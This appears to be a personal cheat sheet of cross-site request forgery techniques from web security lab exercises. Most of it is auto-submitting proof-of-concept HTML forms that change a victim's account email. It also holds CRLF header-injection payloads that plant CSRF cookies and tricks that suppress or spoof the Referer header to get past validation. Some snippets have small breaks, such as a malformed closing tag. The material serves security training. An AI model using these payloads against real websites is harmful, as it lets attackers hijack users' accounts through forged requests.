# CSRF - Cross-site request forgery

## Description

Cross-site request forgery (also known as CSRF) is a web security vulnerability that allows an attacker 
to induce users to perform actions that they do not intend to perform. It allows an attacker to partly circumvent the same origin policy, 
which is designed to prevent different websites from interfering with each other.

### CSRF vulnerability with no defenses
```
<html>
  <!-- CSRF PoC - generated by Burp Suite Professional -->
  <body>
  <script>history.pushState('', '', '/')</script>
  <form method="$method" action="$url"> //default method "get"
  <input type="hidden" name="$param1name" value="$param1value">
  </form>
  <script>
     document.forms[0].submit();
  </script>
  </body>
</html>
```
### CSRF where token validation depends on request method

```
<html>
  <!-- CSRF PoC - generated by Burp Suite Professional -->
  <body>
  <script>history.pushState('', '', '/')</script>
    <form action="https://0a4200f70356384ec05f0126004900e9.web-security-academy.net/myaccount" method="POST">
      <input type="hidden" name="email" value="aaa&#64;exploit&#45;0a2c009c030f3802c0de01d501bb0026&#46;web&#45;security&#45;academy&#46;net" />
      <input type="submit" value="Submit request" />
    </form>
  </body>
</html>
```
### CSRF where token validation depends on token being present

Making a request, such as changing email or other kinds of actions, try to remove the CSRF token.
If it works, generate the PoC from Burp Suite

```
<html>
  <!-- CSRF PoC - generated by Burp Suite Professional -->
  <body>
  <script>history.pushState('', '', '/')</script>
  <form action="$url"> //default method "get"
  <input type="hidden" name="$param1name" value="$param1value">
  </form>
  <script>
     document.forms[0].submit();
  </script>
  </body>
</htm l>
```
## CSRF where token is not tied to user session

Try a PoC with the CSRF  unused from the html page and create a PoC to be delivered

## CSRF where token is tied to non-session cookie

In this case, you can find a csrfKey in the cookie, hopefully you can set it thouh this type of request, the CSRF is not tied to the session cookie
```
/?search=test%0d%0aSet-Cookie:%20csrfKey=your-key
```
On the PoC, remove the block script and use this
```
<img src="$cookie-injection-url" onerror="document.forms[0].submit()">
```


## CSRF where token is duplicated in cookie

In this case, you can find a csrfKey in the cookie, hopefully you can set it thouh this type of request, the CSRF is a duplicated value, in order to make works all the logic
```
/?search=test%0d%0aSet-Cookie:%20csrf=fake
<img src="$cookie-injection-url" onerror="document.forms[0].submit();"/>
```

## CSRF where Referer validation depends on header being present

Change the domain of the url and look that the request can't be done

HTTP/1.1 400 Bad Request
Content-Type: application/json; charset=utf-8
Connection: close
Content-Length: 24

"Invalid referer header"

To avoid the error add

```
<meta name="referre" content="no-referrer">
```

Payload:
```
<html>
<meta name="referrer" content="no-referrer">
  <!-- CSRF PoC - generated by Burp Suite Professional -->
  <body>
  <script>history.pushState('', '', '/')</script>
    <form action="https://0a4800630389a459c023432100b200b3.web-security-academy.net/my-account/change-email" method="POST">
      <input type="hidden" name="email" value="aaa&#64;exploit&#45;0a2c009c030f3802c0de01d501bb0026&#46;web&#45;security&#45;academy&#46;net" />
      <input type="submit" value="Submit request" />
    </form>
    <script>
      document.forms[0].submit();
    </script>
  </body>
</html>
```
## CSRF with broken Referer validation

Try to change the referer header, if you face an error change the url adding something like this:
Referer: https://arbitrary-incorrect-domain.net?your-lab-id.web-security-academy.net
If it works, run the exploit similar to the one below:

Add this in the head section of the exploit server:
```
Referrer-Policy: unsafe-url
```
This add it into the bosy:
```
<html>
  <!-- CSRF PoC - generated by Burp Suite Professional -->
  <body>
  <script>history.pushState('', '', '/?0a90000e0350a410c02c557100b40056.web-security-academy.net/')</script>
    <form action="https://0a90000e0350a410c02c557100b40056.web-security-academy.net/my-account/change-email" method="POST">
      <input type="hidden" name="email" value="test&#64;dontwannacry&#46;com" />
      <input type="submit" value="Submit request" />
    </form>
    <script>
      document.forms[0].submit();
    </script>
  </body>
</html>
```

